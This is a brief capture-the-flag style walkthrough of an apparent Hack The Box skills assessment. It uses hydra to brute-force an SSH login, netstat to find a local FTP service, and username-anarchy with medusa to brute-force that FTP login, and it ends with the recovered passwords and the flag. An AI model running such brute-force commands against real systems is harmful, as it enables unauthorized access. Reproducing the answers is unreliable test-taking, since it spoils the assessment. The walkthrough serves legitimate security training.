User found : satwossh
Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

### Solution

1. What is the username of the ftp user you find via brute-forcing?
```shell
First brute force ssh service with user found:
> hydra -l satwossh -P CPTS/tmp/pass.txt  94.237.62.103 ssh -s 46204
login: satwossh   password: password1

Connect to ssh service and look for service running locally:
> netstat -pentula | grep LISTEN
tcp6       0      0 :::21

There is also a file mentioning Thomas Smith:
> ./username-anarchy Thomas Smith > thomas.txt

Brute force ftp service:
> medusa -h 127.0.0.1 -n 21 -U thomas.txt -P passwords.txt -M ftp -t 3
User: thomas Password: chocolate! [SUCCESS]

Connect to ftp server and retrive flag.
HTB{brut3f0rc1ng_succ3ssful}
```